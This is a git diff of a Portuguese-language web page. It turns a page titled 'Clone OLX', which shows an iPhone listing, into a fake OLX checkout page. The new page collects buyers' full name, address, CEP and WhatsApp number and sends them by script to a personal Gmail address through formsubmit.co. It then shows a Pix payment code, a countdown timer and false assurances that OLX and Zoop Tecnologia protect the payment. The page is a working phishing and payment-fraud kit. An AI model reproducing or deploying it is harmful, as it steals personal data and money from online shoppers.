@@ -2,141 +2,139 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <title>Clone OLX</title>
+  <title>Envio e Pagamento</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #fff;
+      background: #f8f8f8;
       margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 420px;
+      margin: 30px auto;
+      background: white;
       padding: 20px;
-      max-width: 400px;
-      margin: auto;
+      border-radius: 10px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
     }
-
-    .imagem {
+    h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+    input, textarea {
       width: 100%;
-      border-radius: 8px;
+      margin-bottom: 12px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
     }
-
-    .data {
-      font-size: 13px;
-      color: #666;
-      margin-top: 10px;
-    }
-
-    .titulo {
-      font-size: 17px;
-      font-weight: bold;
-      margin-top: 5px;
-    }
-
-    .selos {
-      margin-top: 10px;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 5px;
-    }
-
-    .selo {
-      background-color: #e8e6ff;
-      color: #6b4ede;
-      font-size: 12px;
-      padding: 4px 8px;
-      border-radius: 6px;
-    }
-
-    .precos {
-      margin-top: 15px;
-    }
-
-    .preco-antigo {
-      font-size: 14px;
-      color: #aaa;
-      text-decoration: line-through;
-    }
-
-    .preco-novo {
-      font-size: 28px;
-      font-weight: bold;
-      color: #000;
-    }
-
-    .cartoes {
-      display: flex;
-      gap: 6px;
-      margin-top: 5px;
-    }
-
-    .cartoes img {
-      height: 24px;
-    }
-
-    .parcelamento {
-      font-size: 14px;
-      margin-top: 6px;
-      color: #444;
-    }
-
-    .botoes {
-      display: flex;
-      gap: 10px;
-      margin-top: 20px;
-    }
-
-    .btn {
-      flex: 1;
+    button {
+      background: #f60;
+      color: white;
       padding: 12px;
-      font-weight: bold;
-      text-align: center;
-      border-radius: 8px;
+      border: none;
+      width: 100%;
+      border-radius: 5px;
       cursor: pointer;
+      font-size: 16px;
     }
-
-    .btn.comprar {
-      background: #ff6d00;
-      color: #fff;
+    .alerta {
+      background: #fff4cc;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+      margin-bottom: 20px;
     }
-
-    .btn.chat {
-      border: 2px solid #ff6d00;
-      color: #ff6d00;
+    .alerta strong { font-weight: bold; }
+    .tempo { color: #f60; font-weight: bold; }
+    .valor { font-size: 22px; color: #333; margin: 10px 0; }
+    .pix-code {
+      background: #eee;
+      padding: 10px;
+      border-radius: 5px;
+      word-break: break-word;
+      margin: 10px 0;
+      font-size: 14px;
     }
+    ol {
+      padding-left: 20px;
+      font-size: 14px;
+      color: #333;
+    }
+    a {
+      color: purple;
+      text-decoration: none;
+    }
+    #pagamento { display: none; }
   </style>
 </head>
 <body>
 
-  <img class="imagem" src="https://i.postimg.cc/ZqLbZLfF/iphone-anuncio.jpg" alt="iPhone OLX">
-
-  <div class="data">23/07 às 18:17</div>
-
-  <div class="titulo">Iphone 16 Pro 128Gb (Desert Titanium) - Novo e Lacrado</div>
-
-  <div class="selos">
-    <div class="selo">Frete grátis</div>
-    <div class="selo">Pague Online</div>
-    <div class="selo">Parcelamento sem juros</div>
-    <div class="selo">Garantia da OLX</div>
+  <div class="container" id="formulario">
+    <h2>Preencha seus dados de entrega</h2>
+    <form id="envioForm">
+      <input type="text" name="nome" placeholder="Nome completo" required>
+      <input type="text" name="endereco" placeholder="Endereço completo" required>
+      <input type="text" name="bairro" placeholder="Bairro" required>
+      <input type="text" name="cidade" placeholder="Cidade" required>
+      <input type="text" name="cep" placeholder="CEP" required>
+      <input type="tel" name="telefone" placeholder="WhatsApp" required>
+      <button type="submit">Continuar</button>
+    </form>
   </div>
 
-  <div class="precos">
-    <div class="preco-antigo">R$ 6.299</div>
-    <div class="preco-novo">R$ 6.199</div>
+  <div class="container" id="pagamento">
+    <div class="alerta">
+      ⚠️ Não pedimos comprovante do Pix e nem enviamos por e-mail. A OLX, em parceria com a <strong>Zoop Tecnologia</strong>, cuida do pagamento até você receber seu produto!
+    </div>
+
+    <p><strong>Seu código expira em:</strong> <span class="tempo">04m 39s</span></p>
+
+    <div>
+      <p><strong>Pague por Pix</strong></p>
+      <p class="valor">R$ 6.512,94</p>
+      <p><strong>Processado por</strong><br>Zoop tecnologia</p>
+    </div>
+
+    <p><strong>Copie o código de pagamento:</strong></p>
+    <div class="pix-code" id="pixcode">00020101021226850014br.gov.bcb.pix.qr1234567890abcde</div>
+    <button onclick="copiarPix()">Copiar código Pix</button>
+
+    <ol>
+      <li>Acesse o app do seu banco ou Internet Banking e escolha Pix copia e cola.</li>
+      <li>Cole o código, confira se o pagamento será feito para Zoop Tecnologia.</li>
+      <li>Confirme o pagamento.</li>
+      <li>Prontinho! Acompanhe o pedido em <a href="#">Minhas Compras</a></li>
+    </ol>
   </div>
 
-  <div class="cartoes">
-    <img src="https://i.postimg.cc/Kc0Nzxmh/nu.png" alt="Nubank">
-    <img src="https://i.postimg.cc/MKfcnGhT/visa.png" alt="Visa">
-    <img src="https://i.postimg.cc/KzLkpCRZ/elo.png" alt="Elo">
-    <img src="https://i.postimg.cc/y8W7Nmjf/hiper.png" alt="Hipercard">
-    <img src="https://i.postimg.cc/W4dd4mjG/amex.png" alt="Amex">
-  </div>
+  <script>
+    const form = document.getElementById("envioForm");
+    const formulario = document.getElementById("formulario");
+    const pagamento = document.getElementById("pagamento");
 
-  <div class="parcelamento">3x sem juros de R$ 2.066,33</div>
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
 
-  <div class="botoes">
-    <div class="btn comprar">Comprar</div>
-    <div class="btn chat">Chat</div>
-  </div>
+      const formData = new FormData(form);
+      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        formulario.style.display = "none";
+        pagamento.style.display = "block";
+      }).catch(() => {
+        alert("Erro ao enviar os dados. Tente novamente.");
+      });
+    });
+
+    function copiarPix() {
+      const codigo = document.getElementById("pixcode").innerText;
+      navigator.clipboard.writeText(codigo);
+      alert("Código Pix copiado!");
+    }
+  </script>
 
 </body>
 </html>
